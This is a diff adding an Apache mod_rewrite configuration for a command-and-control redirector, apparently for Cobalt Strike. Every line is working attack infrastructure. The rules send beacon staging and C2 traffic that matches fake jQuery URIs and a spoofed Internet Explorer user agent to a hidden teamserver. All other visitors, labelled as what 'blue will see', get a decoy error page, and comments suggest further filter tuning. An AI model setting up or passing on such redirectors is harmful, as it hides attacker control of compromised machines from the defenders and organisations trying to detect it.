@@ -1,0 +1,18 @@
+## Default Beacon Staging Support (/1234)
+RewriteCond %{REQUEST_METHOD} GET [NC]
+RewriteCond %{REQUEST_URI} ^/..../?$
+RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows NT 6.3; Trident/7.0; rv:11.0\) like Gecko"
+RewriteRule ^.*$ "http://<teamserver-ip>%{REQUEST_URI}" [P,L]
+## C2 Traffic (HTTP-GET, HTTP-POST, HTTP-STAGER URIs)
+## Logic: If a requested URI AND the User-Agent matches, proxy the connection to the Teamserver
+## Consider adding other HTTP checks to fine tune the check.  (HTTP Cookie, HTTP Referer, HTTP Query String, etc)
+## Refer to http://httpd.apache.org/docs/current/mod/mod_rewrite.html
+## Only allow GET and POST methods to pass to the C2 server
+RewriteCond %{REQUEST_METHOD} ^(GET|POST) [NC]
+## Profile URIs
+RewriteCond %{REQUEST_URI} ^(/jquery-3.3.2.slim.min.js.*|/jquery-3.3.1.min.js.*|/jquery-3.3.1.slim.min.js.*|/jquery-3.3.2.min.js.*)$
+## Profile UserAgent
+RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows NT 6.3; Trident/7.0; rv:11.0\) like Gecko"
+RewriteRule ^.*$ "http://<teamserver-ip>%{REQUEST_URI}" [P,L]
+## Redirect all other traffic here
+RewriteRule ^.*$ http://<IP-blue-will-see>/500.html [P,L]
